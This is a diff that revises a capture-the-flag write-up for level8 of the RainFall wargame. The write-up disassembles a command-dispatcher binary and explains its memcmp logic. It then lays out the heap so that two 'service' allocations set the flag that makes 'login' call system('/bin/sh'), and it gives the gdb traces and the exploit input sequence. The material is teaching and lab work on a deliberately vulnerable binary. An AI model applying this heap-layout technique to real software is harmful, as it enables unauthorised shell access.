@@ -1,12 +1,12 @@
 # Way to level9
 
-When we enter the shell `level8`, we can see `level8` excutable file.
+When we enter the shell `level8`, we can see the `level8` executable file.
 
-We can download via `scp` command.
+We can download it via the `scp` command.
 ```bash
 bash-5.3$ scp -P 4242 level8@10.171.55.141:level8 .
 ```
-Or we can check via `gdb` command how it works.
+Or we can check how it works with the `gdb` command.
 ```gdb
 (gdb) disassemble main
 Dump of assembler code for function main:
@@ -57,7 +57,6 @@ Dump of assembler code for function main:
    0x08048604 <+160>:	add    $0x5,%eax
    0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
    0x0804860f <+171>:	mov    %eax,%edx
----Type <return> to continue, or q <return> to quit---
    0x08048611 <+173>:	mov    $0x0,%eax
    0x08048616 <+178>:	mov    0x1c(%esp),%ecx
    0x0804861a <+182>:	mov    %edx,%edi
@@ -106,7 +105,6 @@ Dump of assembler code for function main:
    0x0804869a <+310>:	movsbl %al,%eax
    0x0804869d <+313>:	test   %eax,%eax
    0x0804869f <+315>:	jne    0x80486b5 <main+337>
----Type <return> to continue, or q <return> to quit---
    0x080486a1 <+317>:	lea    0x20(%esp),%eax
    0x080486a5 <+321>:	add    $0x7,%eax
    0x080486a8 <+324>:	mov    %eax,(%esp)
@@ -188,29 +186,49 @@ Non-debugging symbols:
 
 ```
 
-We can notice, there's no suspecious functions. We are going to discover it more.
+There are no suspicious functions here. We are going to dig deeper into it.
 
-Inside of disassemble dump, we can see `seta`and `setb` following `repz cmpsb` this command.
-What is `repz cmpsb`? It is compare two memory block in `ECX` bytes from start. If not equal, it stop comparasion.
+## The command dispatcher
 
-We assume that, the original source contain `memcmp` function.
-Let's give it a look some condition string.
-If we see `mov` command with address.
+`main` runs an endless loop. On each turn it reads one line with `fgets` (up to `0x80` bytes
+into a stack buffer at `0x20(%esp)`), then runs that line through a chain of inline comparisons.
+Each comparison is the same shape: a fixed string address is loaded, `ecx` is set to the length
+to check, and `repz cmpsb` compares the two memory blocks.
+
+What is `repz cmpsb`? It compares two memory blocks byte by byte for up to `ECX` bytes, and
+stops early on a mismatch (either `ECX` reaches `0` or a byte differs). The original source almost
+certainly used `memcmp` here.
+
+The two instructions that follow deserve a careful read, because they are easy to misread:
+
+```asm
+seta   %dl        ; dl = 1 if (unsigned) left > right, else 0
+setb   %al        ; al = 1 if (unsigned) left < right, else 0
+mov    %edx,%ecx
+sub    %al,%cl    ; cl = dl - al  ->  +1 / 0 / -1  (the memcmp result)
+mov    %ecx,%eax
+movsbl %al,%eax   ; sign-extend THAT RESULT, not the compared byte
+test   %eax,%eax
+```
+
+`seta`/`setb` turn the unsigned comparison into a three-valued result (`-1`, `0`, `1`), and
+`movsbl` sign-extends that result — not the compared byte itself. So `test %eax,%eax` is zero only
+when the prefix matched exactly, which is the "command recognized" case.
+
+The fixed strings used by the dispatcher:
 
 ```gdb
+(gdb) x/s 0x8048819
+0x8048819:	 "auth "
+(gdb) x/s 0x804881f
+0x804881f:	 "reset"
+(gdb) x/s 0x8048825
+0x8048825:	 "service"
 (gdb) x/s 0x804882d
 0x804882d:	 "login"
 (gdb) x/s 0x8048833
 0x8048833:	 "/bin/sh"
-(gdb) x/s 0x8048825
-0x8048825:	 "service"
-(gdb) x/s 0x804881f
-0x804881f:	 "reset"
-(gdb) x/s 0x8048819
-0x8048819:	 "auth "
 ```
-
-Let's see more carefully with `x/5c` command in gdb.
 
 ```gdb
 (gdb) x/5c 0x8048819
@@ -224,33 +242,132 @@ Let's see more carefully with `x/5c` command in gdb.
 (gdb) x/5c 0x804881f
 0x804881f:	114 'r'	101 'e'	115 's'	101 'e'	116 't'
 ```
-Cool, we can exploit with this command.
+
+Note that `"auth "` ends with a trailing space (`0x20`), so the compared prefix is 5 bytes.
+
+## The command table
+
+| Command | Prefix len | What it does |
+|---------|-----------|--------------|
+| `auth ` | 5 (`"auth "`) | `malloc(4)`, store the pointer in the global `0x8049aac`, zero the first 4 bytes. Then it checks `strlen(input+5) <= 30` (`repnz scas` + `cmp $0x1e`) and does `strcpy(auth_ptr, input+5)`. **Not used by the attack.** |
+| `reset` | 5 | `free(auth_ptr)` |
+| `service` | 6 | `strdup(input+7)`, store the pointer in the global `0x8049ab0` |
+| `login` | 5 | falls through into the win check below |
+
+There are three globals in play:
+
+- `0x8049aac` — the `auth` pointer (the one the win check reads from)
+- `0x8049ab0` — the `service` pointer
+- `0x8049aa0` — the stream used by the `fwrite` that prints `"Password:\n"`
+
+At the top of each loop, `printf` prints the `auth` and `service` globals as `%p, %p`, which is
+exactly the feedback we need to watch the heap.
+
+## The win condition
+
+The block at `main+382` is the whole game:
+
+```gdb
+0x080486e2 <+382>:	mov    0x8049aac,%eax   ; eax = auth_ptr
+0x080486e7 <+387>:	mov    0x20(%eax),%eax   ; eax = *(auth_ptr + 0x20)
+0x080486ea <+390>:	test   %eax,%eax
+0x080486ec <+392>:	je     0x80486ff <main+411>   ; zero -> just print "Password:"
+0x080486ee <+394>:	movl   $0x8048833,(%esp)       ; "/bin/sh"
+0x080486f5 <+401>:	call   0x8048480 <system@plt>  ; win
+```
+
+After `login`, the program reads the 4-byte dword at `*(auth_ptr + 0x20)`. If it is non-zero it
+calls `system("/bin/sh")`. That dword is effectively the session's "authenticated" flag. The
+attack is simply: **make that dword non-zero.**
+
+## Thinking it through
+
+Running `auth ` and then `login` is the obvious first try, and it fails:
+
 ```bash
 level8@RainFall:~$ ./level8
 (nil), (nil) 
 auth 
 0x804a008, (nil) 
-service
-0x804a008, 0x804a018 
 login
 Password:
-0x804a008, 0x804a018 
+0x804a008, (nil) 
 ```
-Hmmm, it works not. Maybe we have to byte paddings to avoid this.
-```gdb
-0x080486e2 <+382>:	mov    0x8049aac,%eax
-  0x080486e7 <+387>:	mov    0x20(%eax),%eax
-  0x080486ea <+390>:	test   %eax,%eax
-  0x080486ec <+392>:	je     0x80486ff <main+411>
-  0x080486ee <+394>:	movl   $0x8048833,(%esp)
-  0x080486f5 <+401>:	call   0x8048480 <system@plt>
-  0x080486fa <+406>:	jmp    0x8048574 <main+16>
-```
-We focus on this area. It moves `0x20 (32bytes)` and compare, if the value is `0` jump, if not, it's going to call `/bin/sh` command (via system calling).
 
-If we carefully read this disassemble dump, we can notice one memory block `0x8049aac` combine 3 external block.
-So, we can move `auth_ptr` over `0x20`.
-Following this dump, `service_ptr` have `16 bytes` distance from `auth_ptr`, if we use wisely, we can exploit it.
+It doesn't work, because `auth` only ever zeroes the dword it allocates, and the flag at
+`auth_ptr + 0x20` is still `0`.
+
+So let's reason about the single win condition, `*(auth_ptr + 0x20) != 0`:
+
+- `auth ` does `malloc(4)`, so the allocation is only 4 bytes wide. Offset `0x20` is well outside
+  that chunk — nothing the `auth` command itself writes can ever reach it.
+- We therefore need something *else* to end up placing non-zero bytes at `auth_ptr + 0x20`.
+- The only command that repeatedly allocates on the heap is `service`, which calls `strdup`.
+  (The `strcpy`/`strlen` machinery under `auth` is a side branch we never use.)
+- So the plan is to allocate more heap chunks with `service` until one of them lands exactly at
+  `auth_ptr + 0x20`.
+
+Now measure the spacing with gdb. The `%p, %p` printout already shows it: the `auth` chunk is at
+`0x804a008`, the first `service` chunk at `0x804a018`, the next at `0x804a028` — each allocation is
+`0x10` apart (the glibc minimum chunk: header + alignment).
+
+`0x20 / 0x10 = 2`, so the **second** `strdup` chunk lands precisely at `auth_ptr + 0x20`. If that
+chunk holds a non-empty string, its first byte is non-zero — and the flag is forged.
+
+## Heap layout
+
+```
+0x804a008  auth malloc(4)   <- auth_ptr (global 0x8049aac); flag is read at +0x20
+0x804a018  1st strdup       (+0x10)
+0x804a028  2nd strdup       (+0x10)  == auth_ptr + 0x20   <- target
+```
+
+The first `service` grabs `0x804a018`; the second `service` (the one carrying real content)
+lands on `0x804a028`, which is `auth_ptr + 0x20`.
+
+## Verification
+
+```gdb
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+service123456789abcdef
+0x804a008, 0x804a028 
+login
+
+Breakpoint 1, 0x080486e2 in main ()
+(gdb) x/x 0x8049aac
+0x8049aac <auth>:       0x0804a008
+(gdb) x/x 0x8049ab0
+0x8049ab0 <service>:    0x0804a028
+(gdb) p/x $eax
+$1 = 0x0
+(gdb) stepi
+0x080486e7 in main ()
+(gdb) x/s *(0x804a028)
+0x34333231:      <Address 0x34333231 out of bounds>
+(gdb) x/s 0x804a028
+0x804a028:       "123456789abcdef\n"
+(gdb) 
+```
+
+Reading the logs:
+
+- `x/x 0x8049aac` → `0x804a008`, so `auth_ptr = 0x804a008`.
+- `x/x 0x8049ab0` → `0x804a028`, the second `strdup` chunk.
+- `auth_ptr + 0x20 = 0x804a008 + 0x20 = 0x804a028`, which is exactly that second chunk.
+- `x/s 0x804a028` → `"123456789abcdef\n"`, so `*(auth_ptr + 0x20) = "1234" = 0x34333231 != 0`.
+
+The flag dword is non-zero, so `login` takes the `system("/bin/sh")` branch.
+
+## Exploit
+
+Feed the commands in order — `auth `, one empty `service` (to burn the `0x804a018` chunk), a
+second `service` carrying content (which lands on `auth_ptr + 0x20`), then `login`:
+
 ```bash
 level8@RainFall:~$ ./level8
 (nil), (nil) 
@@ -258,7 +375,7 @@ auth
 0x804a008, (nil) 
 service
 0x804a008, 0x804a018 
-serviceabcdef
+service123456789abcdef
 0x804a008, 0x804a028 
 login
 $ whoami
